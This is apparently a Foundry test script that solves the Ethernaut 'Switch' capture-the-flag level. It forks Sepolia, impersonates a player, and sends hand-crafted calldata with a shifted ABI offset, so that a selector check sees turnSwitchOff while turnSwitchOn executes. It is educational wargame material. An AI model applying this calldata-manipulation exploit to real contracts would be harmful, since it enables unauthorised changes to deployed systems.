// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {Switch} from "../src/ethernaut/Switch.sol";

contract SwitchAttacker is Test {
    uint256 constant blockNumber = 6354896;
    address constant alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;
    address switchAddr = 0xE251Dce4249B9530703D64a5543E4942A7E4100A;

    function setUp() external {
        vm.selectFork(
            vm.createFork(vm.envString("SEPOLIA_RPC_URL"), blockNumber)
        );
    }

    function testAttack() public {
        console.log("turnSwitchOff selector:");
        console.logBytes4(Switch.turnSwitchOff.selector);
        console.log("turnSwitchOn selector:");
        console.logBytes4(Switch.turnSwitchOn.selector);
        console.log("Attack Before:");
        console.log("switchOn:", Switch(switchAddr).switchOn());

        _attack();
        console.log("Attack After:");
        console.log("switchOn:", Switch(switchAddr).switchOn());
        assertEq(Switch(switchAddr).switchOn(), true);
    }

    function _attack() internal {
        vm.startPrank(alice);
        /**
         * 0x30c13ade
         * 0000000000000000000000000000000000000000000000000000000000000020
         * 0000000000000000000000000000000000000000000000000000000000000004
         * 76227e1200000000000000000000000000000000000000000000000000000000
         */
        string
            memory calldata_ = "0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000002020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        bytes memory _calldata = vm.parseBytes(calldata_);

        console.logBytes(_calldata);

        (bool success, ) = switchAddr.call(_calldata);
        require(success, "call failed :(");

        vm.stopPrank();
    }

    function testDecodeBytes() external pure {
        bytes memory data = vm.parseBytes("0xAAAAAA");
        address account = vm.addr(111111);

        bytes memory calldata_1 = abi.encode(data, account, uint256(100));

        console.logBytes(calldata_1);

        bytes memory calldata_2 = abi.encode(data);

        console.logBytes(calldata_2);

        assertEq(
            abi.decode(calldata_1, (bytes)),
            abi.decode(calldata_2, (bytes))
        );
    }
}

// forge test --match-contract SwitchAttacker --match-test "testAttack"
